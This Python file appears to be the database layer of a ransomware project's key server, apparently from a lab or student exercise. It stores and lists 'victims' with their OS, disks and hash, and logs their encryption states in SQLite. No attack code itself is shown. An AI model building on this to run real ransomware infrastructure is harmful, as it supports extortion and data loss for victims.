import sqlite3
from datetime import datetime

DB_FILENAME = '../serveur_cles/data/victims.sqlite'


def list_victim():
    # Connection DB
    conn = sqlite3.connect(DB_FILENAME)
    c = conn.cursor()

    c.execute('SELECT id FROM victims')
    # récupération des résultats
    rows = c.fetchall()

    # affichage des résultats
    for row in rows:
        print(row)
    conn.commit()
    conn.close()


def insert_victim(victim):
    '''List_victim_req = { 'LIST_REQ': None }
    list_victim_resp = {
    'VICTIM': id,
    'HASH': hash ,
    'OS': type,
    'DISKS': disks,
    'STATE': state,
    'NB_FILES': nb_files
    }
    list_victim_end = { 'LIST_END': None }'''
    # Connection DB
    conn = sqlite3.connect(DB_FILENAME)
    c = conn.cursor()

    c.execute('INSERT INTO victims VALUES (?, ?, ?, ?,?)', [victim[0], victim[2], victim[1], victim[3], None])

    conn.commit()
    conn.close()


def change_state(victim_id, state):
    # Connection DB
    conn = sqlite3.connect(DB_FILENAME)
    c = conn.cursor()


    cursor = conn.execute("SELECT MAX(id_victim) FROM states")
    max_id = cursor.fetchone()[0] or 0
    state_id = max_id + 1

    date_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    c.execute('INSERT INTO states VALUES (?, ?, ?, ?)', [state_id, victim_id, date_time, state])

    conn.commit()
    conn.close()

'''
# insert fake victims data
for victim in fake_victims:
    c.execute('INSERT INTO victims VALUES (?, ?, ?, ?,?)', [victim[0],victim[2],victim[1],victim[3],None])
'''
'''
# insert fake history data
for i, history in enumerate(fake_histories):
    victim_id = i % len(fake_victims) + 1  # ensure each history row is linked to a different victim
    c.execute('INSERT INTO states VALUES (?, ?, ?, ?)', [i+1, 1, history[0], history[1]])
    c.execute('INSERT INTO encrypted VALUES (?, ?, ?, ?)', [i+1, 1, history[0], history[2]])
'''
# commit the changes and close the connection
